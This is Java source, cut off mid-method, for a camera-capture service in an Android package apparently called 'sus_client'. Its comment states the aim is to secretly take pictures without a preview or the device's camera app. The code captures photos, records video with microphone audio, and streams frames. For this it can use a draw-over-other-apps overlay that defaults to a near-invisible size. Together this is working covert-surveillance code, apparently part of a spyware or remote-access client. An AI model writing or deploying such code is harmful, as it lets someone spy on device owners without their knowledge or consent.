package com.android.sus_client.utils.camera2;

import android.Manifest;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraMetadata;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CaptureResult;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.ParcelFileDescriptor;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.Size;
import android.view.Gravity;
import android.view.Surface;
import android.view.TextureView;
import android.view.ViewGroup;
import android.view.WindowManager;

import com.android.sus_client.annotation.NonNull;
import com.android.sus_client.utils.Utils;
import com.android.sus_client.utils.permissions.PermissionHandler;
import com.android.sus_client.utils.permissions.Permissions;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;
import java.util.TreeMap;
import java.util.concurrent.TimeUnit;


/**
 * Modified from - https://github.com/hzitoun/android-camera2-secret-picture-taker
 * <p>
 * The aim of this service is to secretly take pictures (without preview or opening device's camera app)
 * from all available cameras using Android Camera 2 API
 *
 * @author manoj (manojv097@gmail.com)
 */

//NOTE: camera 2 api was added in API level 21
@TargetApi(Build.VERSION_CODES.LOLLIPOP)
public class CameraCapturingServiceImpl extends ACameraCapturingService {

    private static final String TAG = CameraCapturingServiceImpl.class.getSimpleName();
    private HandlerThread mBackgroundHandlerThread;
    private Handler mBackgroundHandler;

    private CameraDevice cameraDevice;
    private CameraCharacteristics cameraCharacteristics;
    private ImageReader mImageReader;
    private MediaRecorder mMediaRecorder;
    private CaptureRequest.Builder mCaptureRequestBuilder;
    private CameraCaptureSession mRecordCaptureSession;
    private CameraCaptureSession mPreviewCaptureSession;

    // input and output stream for video record
    private InputStream mVideoInputStream;
    private ByteArrayOutputStream mVideoOutputStream;
    private String mVideoCapturingTimer = "0";

    private String currentCameraId;
    private boolean cameraClosed;
    private boolean mIsRecording = false;
    private boolean mIsStream = false;

    /**
     * Setting params
     */
    private Size mPreviewSize = null;
    private Size mVideoSize = null;
    private Size mImageSize = null;
    private File mVideoFile;
    private File mImageFile;

    private int previewWidth, previewHeight;
    private int videoCaptureTimeInMinutes = 1; // in minutes (between 1 to 10 minutes)
    private int imageCompressQuality = 100; // between 10 to 100
    private boolean captureWithOverlayPreview;
    private FlashMode flashMode = FlashMode.FLASH_OFF;
    private CameraFacing cameraFacing = CameraFacing.Back;

    /**
     * Camera 3A configuration
     */
    // By default, AE and AF both not getting triggered, but the user can optionally override this.
    // Also, AF won't get triggered if the lens is fixed-focus.
    boolean doAE = false;
    boolean doAF = false;
    boolean triggeredAE = false;
    boolean triggeredAF = false;
    boolean isFlashSupported;
    boolean isAutoFocusSupported;

    /**
     * stores a sorted map of (pictureUrlOnDisk, PictureData).
     */
    private TreeMap<String, byte[]> picturesTaken;
    private PictureCapturingListener pictureCapturingListener;
    private VideoCapturingListener videoCapturingListener;
    private VideoStreamCapturingListener videoStreamCapturingListener;

    /***
     * private constructor, meant to force the use of {@link #getInstance}  method
     */
    private CameraCapturingServiceImpl(final Context context) {
        super(context);
    }

    /**
     * @param context the context used to get the window manager
     * @return a new instance
     */
    public static ACameraCapturingService getInstance(final Context context) {
        return new CameraCapturingServiceImpl(context);
    }

    @Override
    public void setCameraFacing(CameraFacing cameraFacing) {
        this.cameraFacing = cameraFacing;
    }

    @Override
    public void setImageCompressQuality(int compressQuality) {
        this.imageCompressQuality = (compressQuality > 100) ? 100 : Math.max(compressQuality, 10);
    }

    @Override
    public void setFlashMode(FlashMode flashMode) {
        this.flashMode = flashMode;
    }

    @Override
    public void setVideoCapturingTime(int minutes) {
        this.videoCaptureTimeInMinutes = minutes;
    }

    /**
     * Starts pictures capturing treatment.
     *
     * @param listener picture capturing listener
     */
    @Override
    public void captureImage(PictureCapturingListener listener) {
        this.captureImageWithOverlay(listener, 0, 0);
    }

    @Override
    public void captureImageWithOverlay(PictureCapturingListener listener) {
        this.captureImageWithOverlay(listener, 156, 256);
    }

    @Override
    public void captureImageWithOverlay(PictureCapturingListener listener, int widthInDp, int heightInDp) {
        this.picturesTaken = new TreeMap<>();
        this.pictureCapturingListener = listener;
        this.captureWithOverlayPreview = true;
        this.mIsRecording = false;
        setSize(widthInDp, heightInDp);

        createImageFileName();
        startBackgroundThread();
        mainHandler.post(this::initCameraInternally);
    }


    /**
     * Starts video capturing treatment.
     *
     * @param listener video capturing listener
     */
    @Override
    public void captureVideo(VideoCapturingListener listener) {
        this.captureVideoWithOverlay(listener, 0, 0);
    }

    @Override
    public void captureVideoWithOverlay(VideoCapturingListener listener) {
        this.captureVideoWithOverlay(listener, 156, 256);
    }

    @Override
    public void captureVideoWithOverlay(VideoCapturingListener listener, int widthInDp, int heightInDp) {
        this.videoCapturingListener = listener;
        this.captureWithOverlayPreview = true;
        this.mIsRecording = true;
        setSize(widthInDp, heightInDp);

        createVideoFileName();
        startBackgroundThread();
        mainHandler.post(this::initCameraInternally);
    }

    @Override
    public void streamVideoWithOverlay(VideoStreamCapturingListener listener) {
        this.streamVideoWithOverlay(listener, 156, 256);
    }

    public void streamVideoWithOverlay(VideoStreamCapturingListener listener, int widthInDp, int heightInDp) {
        this.videoStreamCapturingListener = listener;
        this.captureWithOverlayPreview = true;
        this.mIsRecording = false;
        this.mIsStream = true;
        setSize(widthInDp, heightInDp);

        createVideoFileName();
        startBackgroundThread();
        mainHandler.post(this::initCameraInternally);
    }

    private void setSize(int widthInDp, int heightInDp) {
        DisplayMetrics dm = getCurrentDisplayMetrics();
        widthInDp = (widthInDp > 0) ? widthInDp : 1;
        heightInDp = (heightInDp > 0) ? heightInDp : 1;
        previewWidth = (int) (widthInDp * dm.density);
        previewHeight = (int) (heightInDp * dm.density);
    }

    private void initCameraInternally() {
        try {
            if (cameraFacing == CameraFacing.Front) {
                this.currentCameraId = getCameraId(CameraCharacteristics.LENS_FACING_FRONT);
            } else {
                this.currentCameraId = getCameraId(CameraCharacteristics.LENS_FACING_BACK);
                /*if (!mIsRecording && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    manager.setTorchMode(currentCameraId, flashMode == FlashMode.FLASH_ON);
                }*/
            }

            if (!Permissions.isGranted(context, Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO)) {
                Permissions.request(context, new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO}, new PermissionHandler() {
                    @Override
                    public void onGranted(ArrayList<String> grantedPermissions) {
                        initCameraInternally();
                    }
                });
                throw new Exception("Camera or Audio permission not granted!");
            }

            if (captureWithOverlayPreview) {
                if (!checkDrawOverOtherAppsPermission()) {
                    throw new Exception("Draw over other apps permission not granted!");
                }

                // Initialize view drawn over other apps
                addWindowOverlay();
                // Initialize camera here if texture view already initialized
                if (isAvailable()) {
                    setupCamera(getWidth(), getHeight());
                    openCamera2();
                } else {
                    setSurfaceTextureListener(surfaceTextureListener);
                }

            } else {
                setupCamera(getWidth(), getHeight());
                openCamera2();
            }
        } catch (Exception e) {
            handleError(e);
            /*if (e.getMessage() != null && (e.getMessage().contains("CAMERA_DISABLED") || e.getMessage().contains("disabled by policy"))) {
                mainHandler.postDelayed(() -> {
                    Intent intent = new Intent(context, CameraActivity.class);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }, 1000);
            }*/
        }
    }


    private final TextureView.SurfaceTextureListener surfaceTextureListener = new TextureView.SurfaceTextureListener() {
        @Override
        public void onSurfaceTextureAvailable(SurfaceTexture surface, int width, int height) {
            try {
                setupCamera(width, height);
                openCamera2();
            } catch (Exception e) {
                e.printStackTrace();
                handleError(e);
            }
        }

        @Override
        public void onSurfaceTextureSizeChanged(SurfaceTexture surface, int width, int height) {
        }

        @Override
        public boolean onSurfaceTextureDestroyed(SurfaceTexture surface) {
            return false;
        }

        @Override
        public void onSurfaceTextureUpdated(SurfaceTexture surface) {
        }
    };

    private final CameraCaptureSession.CaptureCallback stillCaptureCallback = new CameraCaptureSession.CaptureCallback() {
        @Override
        public void onCaptureCompleted(@NonNull CameraCaptureSession session, @NonNull CaptureRequest request, @NonNull TotalCaptureResult result) {
            super.onCaptureCompleted(session, request, result);
            if (picturesTaken != null && picturesTaken.lastEntry() != null) {
                pictureCapturingListener.onCaptureDone(picturesTaken.lastEntry().getKey(), picturesTaken.lastEntry().getValue());
                log("done taking picture from camera " + cameraFacing.name());
            }
            removeWindowOverlay();
            closeCamera();
        }
    };

    private final CameraCaptureSession.CaptureCallback mPreviewCaptureCallback = new CameraCaptureSession.CaptureCallback() {
        private void process(CaptureResult captureResult) {
            Integer afState = captureResult.get(CaptureResult.CONTROL_AF_STATE);
            log("AF State --> " + afState);

            if (!isAutoFocusSupported && afState == CaptureResult.CONTROL_AF_STATE_INACTIVE) {
                startStillCaptureRequest();
            } else if (afState == CaptureResult.CONTROL_AF_STATE_PASSIVE_FOCUSED ||
                    afState == CaptureResult.CONTROL_AF_STATE_PASSIVE_UNFOCUSED) {
                startStillCaptureRequest();
            }
        }

        @Override
        public void onCaptureCompleted(CameraCaptureSession session, CaptureRequest request, TotalCaptureResult result) {
            super.onCaptureCompleted(session, request, result);
            if (!mIsStream) process(result);
        }
    };

    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            log("Camera opened " + camera.getId());
            cameraClosed = false;
            cameraDevice = camera;

            try {
                if (mIsRecording) {
                    setupMediaRecorder();
                    captureRecordingWithPreview();
                    startMediaRecorder();
                } else if (mIsStream) {
                    startPreviewForStream();
                } else {
                    if (captureWithOverlayPreview) {
                        startPreview();
                    } else {
                        //Taking the picture after some delay. It may resolve getting a black dark photos.
                        mainHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                captureImageFromCamera();
                            }
                        }, 1000);
                    }
                }
            } catch (final Exception e) {
                handleError(e);
            }
        }

        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            log(" camera " + camera.getId() + " disconnected");
            if (cameraDevice != null && !cameraClosed) {
                cameraClosed = true;
                cameraDevice.close();
            }
        }

        @Override
        public void onClosed(@NonNull CameraDevice camera) {
            cameraClosed = true;
            log("camera " + camera.getId() + " closed");
        }

        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            log("camera in error, int code " + error);
            if (cameraDevice != null && !cameraClosed) {
                cameraDevice.close();
            }
        }
    };

    /**
     * Begin to setup camera
     */

    private void setupCamera(int width, int height) throws CameraAccessException {
        cameraCharacteristics = manager.getCameraCharacteristics(currentCameraId);
        StreamConfigurationMap map = cameraCharacteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
        Boolean flashAvailable = cameraCharacteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
        isFlashSupported = flashAvailable != null && flashAvailable;
        if (!isFlashSupported) flashMode = FlashMode.FLASH_OFF;
        updateAutoFocusMode();

        mImageSize = chooseBestSize(map.getOutputSizes(ImageFormat.JPEG));
        mPreviewSize = chooseOptimalSize(map.getOutputSizes(SurfaceTexture.class), width, height, mImageSize);
        mVideoSize = chooseOptimalSize(map.getOutputSizes(MediaRecorder.class), width, height, mImageSize);

        if (mIsStream) {
            mImageReader = ImageReader.newInstance(mVideoSize.getWidth(), mVideoSize.getHeight(), ImageFormat.YUV_420_888, 2);
        } else {
            mImageReader = ImageReader.newInstance(mImageSize.getWidth(), mImageSize.getHeight(), ImageFormat.JPEG, 1);
        }
        mImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(ImageReader imReader) {
                if (mIsStream) {
                    processStreamImages(imReader);
                } else {
                    Image image = imReader.acquireLatestImage();
                    final ByteBuffer byteBuffer = image.getPlanes()[0].getBuffer();
                    final byte[] bytes = new byte[byteBuffer.capacity()];
                    byteBuffer.get(bytes);
                    saveImageToDisk(bytes);
                    image.close();
                }
            }
        }, (mIsStream ? mBackgroundHandler : null));
    }

    @SuppressLint("MissingPermission")
    private void openCamera2() throws Exception {
        if (Permissions.isGranted(context, Manifest.permission.CAMERA)) {
            manager.openCamera(currentCameraId, stateCallback, null);
        } else {
            throw new Exception("Camera permission not granted!");
        }
    }

    /**
     * Begin to preview with TextureView
     */
    private void startPreview() throws CameraAccessException {
        final SurfaceTexture surfaceTexture = getSurfaceTexture();
        surfaceTexture.setDefaultBufferSize(mPreviewSize.getWidth(), mPreviewSize.getHeight());
        Surface previewSurface = new Surface(surfaceTexture);

        mCaptureRequestBuilder = getCaptureRequest(mPreviewSize.getWidth(), mPreviewSize.getHeight(), CameraDevice.TEMPLATE_PREVIEW);
        mCaptureRequestBuilder.addTarget(previewSurface);
        cameraDevice.createCaptureSession(Arrays.asList(previewSurface, mImageReader.getSurface()), new CameraCaptureSession.StateCallback() {
            @Override
            public void onConfigured(@NonNull CameraCaptureSession session) {
                try {
                    mPreviewCaptureSession = session;
                    mPreviewCaptureSession.stopRepeating();
                    mPreviewCaptureSession.setRepeatingRequest(mCaptureRequestBuilder.build(), mPreviewCaptureCallback, mBackgroundHandler);
                } catch (CameraAccessException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
            }
        }, null);
    }

    private void startPreviewForStream() throws CameraAccessException {
        final SurfaceTexture surfaceTexture = getSurfaceTexture();
        surfaceTexture.setDefaultBufferSize(mVideoSize.getWidth(), mVideoSize.getHeight());
        Surface previewSurface = new Surface(surfaceTexture);

        mCaptureRequestBuilder = getCaptureRequest(mVideoSize.getWidth(), mVideoSize.getHeight(), CameraDevice.TEMPLATE_PREVIEW);
        mCaptureRequestBuilder.addTarget(previewSurface);
        mCaptureRequestBuilder.addTarget(mImageReader.getSurface());
        cameraDevice.createCaptureSession(Arrays.asList(previewSurface, mImageReader.getSurface()), new CameraCaptureSession.StateCallback() {
            @Override
            public void onConfigured(@NonNull CameraCaptureSession session) {
                if (null == cameraDevice) {
                    return;
                }
                mPreviewCaptureSession = session;
                try {
                    mCaptureRequestBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                    mCaptureRequestBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
                    mPreviewCaptureSession.setRepeatingRequest(mCaptureRequestBuilder.build(), mPreviewCaptureCallback, mBackgroundHandler);
                } catch (CameraAccessException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
            }
        }, null);
    }

    private void captureRecordingWithPreview() throws Exception {
        final SurfaceTexture surfaceTexture = getSurfaceTexture();
        surfaceTexture.setDefaultBufferSize(mPreviewSize.getWidth(), mPreviewSize.getHeight());
        Surface previewSurface = new Surface(surfaceTexture);
        Surface recordSurface = mMediaRecorder.getSurface();

        mCaptureRequestBuilder = getCaptureRequest(mVideoSize.getWidth(), mVideoSize.getHeight(), CameraDevice.TEMPLATE_RECORD);
        mCaptureRequestBuilder.addTarget(previewSurface);
        mCaptureRequestBuilder.addTarget(recordSurface);
        cameraDevice.createCaptureSession(Arrays.asList(previewSurface, recordSurface, mImageReader.getSurface()), new CameraCaptureSession.StateCallback() {
            @Override
            public void onConfigured(CameraCaptureSession session) {
                try {
                    mRecordCaptureSession = session;
                    mRecordCaptureSession.setRepeatingRequest(mCaptureRequestBuilder.build(), null, null);
                } catch (final CameraAccessException e) {
                    log("An Exception occurred in " + cameraFacing.name() + " camera \n" + e.getMessage());
                }
            }

            @Override
            public void onConfigureFailed(CameraCaptureSession session) {
                Log.d(TAG, "onConfigureFailed: startRecord");
            }
        }, null);
    }

    /**
     * Begin to Capture image
     */
    private void captureImageFromCamera() {
        try {
            mCaptureRequestBuilder = getCaptureRequest(mImageSize.getWidth(), mImageSize.getHeight(), CameraDevice.TEMPLATE_STILL_CAPTURE);
            mCaptureRequestBuilder.addTarget(mImageReader.getSurface());
            cameraDevice.createCaptureSession(Collections.singletonList(mImageReader.getSurface()), new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(@NonNull CameraCaptureSession session) {
                    try {
                        session.capture(mCaptureRequestBuilder.build(), stillCaptureCallback, null);
                    } catch (final CameraAccessException e) {
                        log("An Exception occurred in " + cameraFacing.name() + " camera \n" + e.getMessage());
                    }
                }

                @Override
                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                }
            }, null);
        } catch (final CameraAccessException e) {
            log("Exception occurred " + "\n" + e.getMessage());
        }
    }

    private void startStillCaptureRequest() {
        try {
            if (!mIsRecording) {
                mCaptureRequestBuilder = getCaptureRequest(mImageSize.getWidth(), mImageSize.getHeight(), CameraDevice.TEMPLATE_STILL_CAPTURE);
                mCaptureRequestBuilder.addTarget(mImageReader.getSurface());
                mPreviewCaptureSession.capture(mCaptureRequestBuilder.build(), stillCaptureCallback, null);
            }
        } catch (Exception e) {
            log("Error in still capture --> " + e.getMessage());
        }
    }

    private void closeCamera() {
        log("closing camera " + cameraFacing.name());
        if (mMediaRecorder != null) {
            try {
                mMediaRecorder.stop();
                mMediaRecorder.reset();
                mMediaRecorder.release();
            } catch (Exception ignored) {
            }
            mMediaRecorder = null;
        }
        if (cameraDevice != null && !cameraClosed) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (mImageReader != null) {
            mImageReader.close();
            mImageReader = null;
        }
        stopBackgroundThread();
    }

    /**
     * Example-> CameraDevice.TEMPLATE_PREVIEW, CameraDevice.TEMPLATE_STILL_CAPTURE, CameraDevice.TEMPLATE_VIDEO_SNAPSHOT
     */
    private CaptureRequest.Builder getCaptureRequest(int width, int height, int templateType) throws CameraAccessException {
        cameraCharacteristics = manager.getCameraCharacteristics(currentCameraId);
        updateAutoFocusMode();

        // Get the user-specified regions for AE, AWB, AF.
        // Note that the user specifies normalized [x,y,w,h], which is converted below
        // to an [x0,y0,x1,y1] region in sensor coords. The capture request region
        // also has a fifth "weight" element: [x0,y0,x1,y1,w].

        /*MeteringRectangle[] regionAE = new MeteringRectangle[]{new MeteringRectangle(0, 0, width, height, 1)};
        MeteringRectangle[] regionAF = new MeteringRectangle[]{new MeteringRectangle(0, 0, width, height, 1)};
        MeteringRectangle[] regionAWB = new MeteringRectangle[]{new MeteringRectangle(0, 0, width, height, 1)};*/

        // Baseline capture request for 3A.
        CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(templateType);
        updateFlashMode(captureBuilder, templateType != CameraDevice.TEMPLATE_STILL_CAPTURE);
        captureBuilder.set(CaptureRequest.JPEG_ORIENTATION, getJpegOrientation(cameraCharacteristics));
        captureBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
        captureBuilder.set(CaptureRequest.CONTROL_CAPTURE_INTENT, CaptureRequest.CONTROL_CAPTURE_INTENT_PREVIEW);
        captureBuilder.set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, 0);
        captureBuilder.set(CaptureRequest.CONTROL_AE_LOCK, false);
//        captureBuilder.set(CaptureRequest.CONTROL_AE_REGIONS, regionAE);
        captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, isAutoFocusSupported ? CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE : CaptureRequest.CONTROL_AF_MODE_OFF);
//        captureBuilder.set(CaptureRequest.CONTROL_AF_REGIONS, regionAF);
//        captureBuilder.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO);
//        captureBuilder.set(CaptureRequest.CONTROL_AWB_LOCK, false);
//        captureBuilder.set(CaptureRequest.CONTROL_AWB_REGIONS, regionAWB);

        // Trigger AE first.
        if (doAE && !triggeredAE) {
            captureBuilder.set(CaptureRequest.CONTROL_AE_PRECAPTURE_TRIGGER, CaptureRequest.CONTROL_AE_PRECAPTURE_TRIGGER_START);
            triggeredAE = true;
        }

        // After AE has converged, trigger AF.
        if (doAF && !triggeredAF) {
            captureBuilder.set(CaptureRequest.CONTROL_AF_TRIGGER, CaptureRequest.CONTROL_AF_TRIGGER_START);
            triggeredAF = true;
        }
        return captureBuilder;
    }

    private void updateFlashMode(CaptureRequest.Builder builder, boolean isPreviewSession) {
        if (isPreviewSession) {
            // For preview session
            builder.set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON);
            if (flashMode == FlashMode.FLASH_TORCH) {
                builder.set(CaptureRequest.FLASH_MODE, CameraMetadata.FLASH_MODE_TORCH);
            } else {
                builder.set(CaptureRequest.FLASH_MODE, CameraMetadata.FLASH_MODE_OFF);
            }
        } else {
            // For capture session
            switch (flashMode) {
                case FLASH_OFF:
                    builder.set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON);
                    builder.set(CaptureRequest.FLASH_MODE, CameraMetadata.FLASH_MODE_OFF);
                    break;
                case FLASH_ON:
                    builder.set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON_ALWAYS_FLASH);
                    builder.set(CaptureRequest.FLASH_MODE, CameraMetadata.FLASH_MODE_OFF);
                    break;
                case FLASH_TORCH:
                    builder.set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON);
                    builder.set(CaptureRequest.FLASH_MODE, CameraMetadata.FLASH_MODE_TORCH);
                    break;
                case FLASH_AUTO:
                    builder.set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON_AUTO_FLASH);
                    builder.set(CaptureRequest.FLASH_MODE, CameraMetadata.FLASH_MODE_OFF);
                    break;
                case FLASH_RED_EYE:
                    builder.set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON_AUTO_FLASH_REDEYE);
                    builder.set(CaptureRequest.FLASH_MODE, CameraMetadata.FLASH_MODE_OFF);
                    break;
            }
        }
    }

    private void updateAutoFocusMode() {
        // when AutoFocus not supported then AfState will always remain INACTIVE
        int[] modes = cameraCharacteristics.get(CameraCharacteristics.CONTROL_AF_AVAILABLE_MODES);
        isAutoFocusSupported = modes != null && modes.length != 0 && (modes.length != 1 || modes[0] != CameraCharacteristics.CONTROL_AF_MODE_OFF);
    }

    /*
     * Setup media recorder
     * */
    private final boolean useFileDescriptor = false;

    private void setupMediaRecorder() throws IOException {
        mMediaRecorder = new MediaRecorder();
        mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);

        if (useFileDescriptor) {
            ParcelFileDescriptor[] descriptors = ParcelFileDescriptor.createPipe();
            ParcelFileDescriptor parcelRead = new ParcelFileDescriptor(descriptors[0]);
            ParcelFileDescriptor parcelWrite = new ParcelFileDescriptor(descriptors[1]);
            mVideoInputStream = new ParcelFileDescriptor.AutoCloseInputStream(parcelRead);
            mVideoOutputStream = new ByteArrayOutputStream();

            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mMediaRecorder.setVideoEncodingBitRate(1000000);
            mMediaRecorder.setVideoFrameRate(30);
            mMediaRecorder.setVideoSize(mVideoSize.getWidth(), mVideoSize.getHeight());
            mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            //mMediaRecorder.setOutputFile(localSender.getFileDescriptor());
            mMediaRecorder.setOutputFile(parcelWrite.getFileDescriptor());

        } else {
            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mMediaRecorder.setOutputFile(mVideoFile.getAbsolutePath());
            mMediaRecorder.setVideoEncodingBitRate(1000000);
            mMediaRecorder.setVideoFrameRate(30);
            mMediaRecorder.setVideoSize(mVideoSize.getWidth(), mVideoSize.getHeight());
            mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        }

        mMediaRecorder.setOrientationHint(getJpegOrientation(cameraCharacteristics));
        mMediaRecorder.prepare();
    }

    private void startMediaRecorder() throws IOException {
        mMediaRecorder.start();

        // start timer
        new CountDownTimer(60000L * videoCaptureTimeInMinutes, 1000) {
            @SuppressLint("DefaultLocale")
            @Override
            public void onTick(long millisUntilFinished) {
                long millisToComplete = 60000L * videoCaptureTimeInMinutes - millisUntilFinished;
                mVideoCapturingTimer = String.format("%d minute, %d seconds", TimeUnit.MILLISECONDS.toMinutes(millisToComplete),
                        TimeUnit.MILLISECONDS.toSeconds(millisToComplete) - TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(millisToComplete)));
                videoCapturingListener.onCapturingProgress(mVideoCapturingTimer);
            }

            @Override
            public void onFinish() {
                closeCamera();
                try (final FileInputStream fis = context.openFileInput(mVideoFile.getName())) {
                    byte[] bytes = new byte[(int) fis.getChannel().size()];
                    fis.read(bytes);
                    fis.close();
                    videoCapturingListener.onCaptureDone(mVideoFile.getAbsolutePath(), bytes);
                } catch (final IOException e) {
                    log("Exception occurred while reading video from storage " + "\n" + e.getMessage());
                }
            }
        }.start();

        if (useFileDescriptor) {
            int read;
            byte[] data = new byte[16384];
            //while ((read = localReceiver.getInputStream().read(data, 0, data.length)) != -1) {
            while ((read = mVideoInputStream.read(data, 0, data.length)) != -1) {
                mVideoOutputStream.write(data, 0, read);
            }
        }
    }

    private void createImageFileName() {
        final String name = "Captured_Image_" + cameraFacing.name() + "_" + System.currentTimeMillis() + ".jpg";
        mImageFile = context.getFileStreamPath(name);
    }

    private void createVideoFileName() {
        final String name = "Captured_Video_" + cameraFacing.name() + "_" + System.currentTimeMillis() + ".mp4";
        mVideoFile = context.getFileStreamPath(name);
    }

    private void saveImageToDisk(byte[] bytes) {
        if (mImageFile == null) {
            createImageFileName();
        }
        try (final FileOutputStream output = context.openFileOutput(mImageFile.getName(), Context.MODE_PRIVATE)) {
            if (imageCompressQuality >= 100) {
                output.write(bytes);
                picturesTaken.put(mImageFile.getAbsolutePath(), bytes);
            } else {
                final Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                ByteArrayOutputStream stream = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, imageCompressQuality, stream);
                byte[] compressBytes = stream.toByteArray();
                output.write(compressBytes);
                picturesTaken.put(mImageFile.getAbsolutePath(), compressBytes);
            }
        } catch (final IOException e) {
            log("Exception occurred while saving picture to storage " + "\n" + e.getMessage());
        }
    }

    //TODO getting frames of live camera footage and passing them to model
    private boolean isProcessingFrame = false;
    private byte[][] yuvBytes = new byte[3][];
    private int[] rgbBytes = null;
    private int yRowStride = 0;

    private void processStreamImages(ImageReader reader) {
        int width = mVideoSize.getWidth();
        int height = mVideoSize.getHeight();
        // We need wait until we have some size from onPreviewSizeChosen
        if (width == 0 || height == 0) {
            return;
        }
        if (rgbBytes == null) {
            rgbBytes = new int[]{width * height};
        }
        try {
            Image image = reader.acquireLatestImage();
            if (image == null) return;
            if (isProcessingFrame) {
                image.close();
                return;
            }

            isProcessingFrame = true;
            Image.Plane[] planes = image.getPlanes();
            fillBytes(planes, yuvBytes);

            yRowStride = planes[0].getRowStride();
            int uvRowStride = planes[1].getRowStride();
            int uvPixelStride = planes[1].getPixelStride();
            Runnable imageConverter = () -> {
                CameraUtils.convertYUV420ToARGB8888(yuvBytes[0], yuvBytes[1], yuvBytes[2],
                        width, height, yRowStride, uvRowStride, uvPixelStride, rgbBytes);
            };
            Runnable postInferenceCallback = () -> {
                image.close();
                isProcessingFrame = false;
            };

            // process image from rgbBytes
            imageConverter.run();
            Bitmap rgbFrameBitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
            rgbFrameBitmap.setPixels(rgbBytes, 0, width, 0, 0, width, height);
            mBackgroundHandler.post(() -> {
                ByteArrayOutputStream stream = new ByteArrayOutputStream();
                rgbFrameBitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
                videoStreamCapturingListener.onCapturingProgress(5, width, height, stream.toByteArray());
            });
            log("processStreamImages ==> finish, " + isProcessingFrame);
            postInferenceCallback.run();
        } catch (Exception ignored) {
        }
    }

    private void fillBytes(Image.Plane[] planes, byte[][] yuvBytes) {
        // Because of the variable row stride it's not possible to know in
        // advance the actual necessary dimensions of the yuv planes.
        for (int i = 0; i < planes.length; i++) {
            ByteBuffer buffer = planes[i].getBuffer();
            if (yuvBytes[i] == null) {
                yuvBytes[i] = new byte[buffer.capacity()];
            }
            buffer.get(yuvBytes[i]);
        }
    }

    private void handleError(@NonNull Exception e) {
        String error = "Exception occurred while capturing with " + cameraFacing.name() + " camera. \n"
                + (TextUtils.isEmpty(e.getMessage()) ? e.toString() : e.getMessage());
        log(error);
        if (mIsRecording) {
            videoCapturingListener.onCaptureError(error);
        } else if (mIsStream) {
            videoStreamCapturingListener.onCaptureError(error);
        } else {
